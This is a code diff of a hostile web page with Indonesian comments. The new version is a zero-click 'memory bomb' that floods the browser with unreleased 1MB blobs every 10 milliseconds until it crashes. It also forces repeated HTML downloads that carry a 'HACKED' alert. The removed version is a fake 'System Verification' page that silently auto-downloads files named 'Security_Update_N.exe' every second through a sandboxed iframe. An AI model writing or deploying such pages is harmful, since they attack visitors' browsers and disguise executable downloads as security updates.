@@ -1,93 +1,89 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>System Verification</title>
-  <style>
-    body { background: #f4f6f8; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
-    h1 { color: #333; margin-bottom: 10px; }
-    p { color: #666; }
-    #status { margin-top: 20px; color: #007aff; font-weight: bold; font-family: monospace; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Security Check</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: monospace; background: #111; color: #0f0; padding: 20px; text-align: center; overflow: hidden; }
+  .panel { background: #222; padding: 20px; border-radius: 12px; max-width: 500px; margin: 50px auto; border: 1px solid #333; }
+  h2 { color: #f00; margin-bottom: 15px; animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #status { margin-top: 15px; font-weight: bold; padding: 10px; background: #000; border-radius: 6px; color: #ff0; }
+</style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🔒 Security Check</h1>
-  <p id="status">Menyiapkan pembaruan...</p>
+  <h2>☢️ MEMORY EXHAUSTION ☢️</h2>
+  <p>Mengalokasikan RAM dan membuat Blob secara brutal...</p>
+  <div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  var statusEl = document.getElementById('status');
-  var downloadCount = 0;
+  var statusDiv = document.getElementById('status');
+  var blobUrls = []; // Array untuk menahan URL (Memory Leak)
+  var count = 0;
+  var isProcessing = false;
+
+  // Payload HTML untuk file yang diunduh
+  var payloadText = "<!DOCTYPE html><html><body><script>alert('HACKED BY SHADOW CORE')<\/script></body></html>";
 
   // ============================================
-  // 1. PAYLOAD PEMBUAT FILE (BASE64)
+  // FUNGSI MEMORY BOMB (OOM & FLOODING)
   // ============================================
-  // Header file (Base64). Ganti dengan payload asli Anda.
-  // "TVqQAAMAAAAEAAAAAEEAAgBA" adalah header MZ (EXE).
-  var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA"; 
+  function triggerMemoryBomb() {
+    if (isProcessing) return;
+    isProcessing = true;
+    statusDiv.innerText = "Memulai serangan DoS...";
 
-  // ============================================
-  // 2. FUNGSI MEMBUAT BLOB & TRIGGER DOWNLOAD
-  // ============================================
-  function triggerSilentDownload() {
-    try {
-      // Decode Base64 ke Bytes
-      var binary = atob(b64Data);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) {
-        bytes[i] = binary.charCodeAt(i);
+    // Loop tanpa henti (setiap 10ms)
+    var interval = setInterval(function() {
+      try {
+        // 1. Buat Blob (Ukuran 1MB agar cepat penuh)
+        var blobData = new Uint8Array(1024 * 1024); // 1MB
+        blobData.fill(1);
+        var blob = new Blob([blobData], { type: 'application/octet-stream' });
+        
+        // 2. Buat Object URL
+        var url = URL.createObjectURL(blob);
+        
+        // 3. TAHAN URL DI MEMORY (Jangan di-revoke)
+        // Ini yang menyebabkan Memory Leak (Out of Memory)
+        blobUrls.push(url);
+        
+        count++;
+        statusDiv.innerText = "Blob dialokasikan: " + count + " MB";
+
+        // 4. Setiap 50MB, picu unduhan untuk menambah beban
+        if (count % 50 === 0) {
+          var a = document.createElement('a');
+          a.href = URL.createObjectURL(new Blob([payloadText], { type: 'text/html' }));
+          a.download = `waguri-bomb-${count}.html`;
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          a.click();
+          // Jangan hapus 'a' atau revoke URL agar memory leak makin parah
+        }
+
+      } catch(e) {
+        // Jika browser sudah kehabisan memori, akan error di sini
+        clearInterval(interval);
+        statusDiv.innerText = "BROWSER CRASH: " + e.message;
+        statusDiv.style.color = "#f00";
       }
-
-      // Buat Blob dengan MIME Type 'application/octet-stream'
-      // MIME Sniffing Bypass: Beberapa browser mengizinkan unduhan otomatis 
-      // untuk tipe ini di dalam sandbox.
-      var blob = new Blob([bytes], { type: 'application/octet-stream' });
-      var url = URL.createObjectURL(blob);
-
-      // Buat iframe sandbox untuk menampung link unduhan
-      var iframe = document.createElement("iframe");
-      iframe.srcdoc = `<body><a id="dl" href="${url}" download="Security_Update_${downloadCount}.exe">Download</a></body>`;
-      
-      // ATRIBUT KRUSIAL: allow-downloads-without-user-activation
-      iframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
-      iframe.style.display = "none";
-      
-      document.body.appendChild(iframe);
-
-      // Pemicu klik otomatis di dalam iframe
-      iframe.onload = function() {
-        try {
-          var doc = iframe.contentDocument || iframe.contentWindow.document;
-          var link = doc.getElementById('dl');
-          if (link) {
-            link.click();
-            downloadCount++;
-            statusEl.innerText = "Telah mengunduh: " + downloadCount + " file";
-            console.log("[!] Download triggered: " + downloadCount);
-          }
-        } catch(e) {}
-      };
-
-      // Cleanup URL setelah 10 detik
-      setTimeout(function() {
-        URL.revokeObjectURL(url);
-      }, 10000);
-
-    } catch(e) {
-      console.error("Download error:", e);
-    }
+    }, 10); // 10ms = 100x per detik
   }
 
   // ============================================
-  // 3. ZERO-CLICK LOOP (Setiap 1 Detik)
+  // TRIGGER OTOMATIS (ZERO-CLICK)
   // ============================================
-  setInterval(triggerSilentDownload, 1000);
+  // Jalankan setelah 1 detik halaman dimuat
+  setTimeout(triggerMemoryBomb, 1000);
 
 })();
 </script>
